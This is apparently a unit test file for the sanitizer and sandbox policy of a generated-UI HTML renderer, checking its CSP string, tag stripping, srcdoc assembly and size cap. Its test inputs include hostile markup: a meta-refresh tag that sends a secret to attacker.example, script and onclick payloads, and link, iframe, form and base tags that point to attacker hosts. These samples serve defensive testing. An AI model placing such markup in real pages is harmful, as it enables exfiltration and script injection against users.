import { describe, expect, it } from "vite-plus/test";

import {
  buildGenUiSrcdoc,
  GENUI_CSP,
  GENUI_SANDBOX,
  genUiHtmlByteLength,
  isGenUiHtmlWithinCap,
  MAX_GENUI_HTML_BYTES,
  sanitizeGenUiHtml,
} from "./genUiArtifact";

describe("genUiArtifact security policy", () => {
  it("keeps the sandbox fully inert (no scripts, no same-origin)", () => {
    expect(GENUI_SANDBOX).toBe("");
    // The two tokens that would break the model must never appear.
    expect(GENUI_SANDBOX).not.toContain("allow-scripts");
    expect(GENUI_SANDBOX).not.toContain("allow-same-origin");
  });

  it("denies script execution and all network egress in the CSP", () => {
    expect(GENUI_CSP).toContain("default-src 'none'");
    // No script-src => default-src 'none' blocks scripts as defense-in-depth.
    expect(GENUI_CSP).not.toContain("script-src");
    // No connect-src / remote origins => fetch, XHR, WebSocket, beacons blocked.
    expect(GENUI_CSP).not.toContain("connect-src");
    expect(GENUI_CSP).not.toMatch(/https?:/);
    expect(GENUI_CSP).not.toContain("*");
    // Inert self-contained rendering only (inline styles + data: media).
    expect(GENUI_CSP).toContain("style-src 'unsafe-inline'");
    expect(GENUI_CSP).toContain("img-src data:");
    expect(GENUI_CSP).toContain("base-uri 'none'");
    expect(GENUI_CSP).toContain("form-action 'none'");
    // Deny self-navigation (meta refresh) where supported.
    expect(GENUI_CSP).toContain("navigate-to 'none'");
    // Never enable eval or inline scripts.
    expect(GENUI_CSP).not.toContain("unsafe-eval");
    expect(GENUI_CSP).not.toContain("script-src 'unsafe-inline'");
  });

  it("uses no double quotes so it embeds safely in an HTML attribute", () => {
    expect(GENUI_CSP).not.toContain('"');
  });
});

describe("sanitizeGenUiHtml (primary defense)", () => {
  it("drops <meta> so there is no meta-refresh auto-navigation egress", () => {
    const out = sanitizeGenUiHtml(
      '<meta http-equiv="refresh" content="0;url=https://attacker.example/?d=secret">',
    );
    expect(out).not.toContain("refresh");
    expect(out).not.toContain("http-equiv");
    expect(out).not.toContain("attacker.example");
  });

  it("drops scripts and event handlers", () => {
    expect(sanitizeGenUiHtml("<script>alert(1)</script><p>ok</p>")).not.toContain("alert");
    expect(sanitizeGenUiHtml('<div onclick="steal()">hi</div>')).not.toContain("onclick");
    expect(sanitizeGenUiHtml('<div onclick="steal()">hi</div>')).not.toContain("steal");
  });

  it("drops navigation/loading elements (a, iframe, form, object, base)", () => {
    const out = sanitizeGenUiHtml(
      '<a href="https://attacker/?d=x">click</a><iframe src="https://x"></iframe>' +
        '<form action="https://x"></form><object data="https://x"></object><base href="https://x">',
    );
    expect(out).not.toContain("attacker");
    expect(out).not.toContain("<iframe");
    expect(out).not.toContain("<form");
    expect(out).not.toContain("<object");
    expect(out).not.toContain("<base");
    // Anchor text is unwrapped and kept as inert text.
    expect(out).toContain("click");
  });

  it("keeps declarative visuals: inline <style> and style/class attributes", () => {
    expect(sanitizeGenUiHtml("<style>.bar{background:#4338ca}</style>")).toContain(
      ".bar{background:#4338ca}",
    );
    const styled = sanitizeGenUiHtml('<div class="bar" style="height:50%">x</div>');
    expect(styled).toContain('style="height:50%"');
    expect(styled).toContain("bar");
  });
});

describe("buildGenUiSrcdoc", () => {
  it("wraps sanitized markup in a complete CSP-guarded document", () => {
    const doc = buildGenUiSrcdoc("<p>hi</p>");
    expect(doc.startsWith("<!doctype html>")).toBe(true);
    expect(doc).toContain(`<meta http-equiv="Content-Security-Policy" content="${GENUI_CSP}">`);
    expect(doc).toContain("<body><p>hi</p></body>");
  });

  it("emits the CSP meta before the untrusted body so the policy governs it", () => {
    const doc = buildGenUiSrcdoc("<p>content</p>");
    const cspIndex = doc.indexOf("Content-Security-Policy");
    const bodyIndex = doc.indexOf("<body>");
    expect(cspIndex).toBeGreaterThan(-1);
    expect(cspIndex).toBeLessThan(bodyIndex);
  });

  it("strips any policy the markup tries to inject (sanitizer removes <meta>)", () => {
    const doc = buildGenUiSrcdoc(
      '<meta http-equiv="Content-Security-Policy" content="default-src *">',
    );
    expect(doc).not.toContain("default-src *");
    // Our policy is the only CSP present, exactly once.
    expect(doc.split("Content-Security-Policy").length - 1).toBe(1);
  });
});

describe("genUiArtifact size cap", () => {
  it("measures UTF-8 byte length", () => {
    expect(genUiHtmlByteLength("abc")).toBe(3);
    // A 4-byte emoji is more bytes than its string length.
    expect(genUiHtmlByteLength("😀")).toBeGreaterThan(1);
  });

  it("accepts small markup and refuses oversized markup", () => {
    expect(isGenUiHtmlWithinCap("<p>ok</p>")).toBe(true);
    expect(isGenUiHtmlWithinCap("x".repeat(MAX_GENUI_HTML_BYTES + 1))).toBe(false);
  });
});
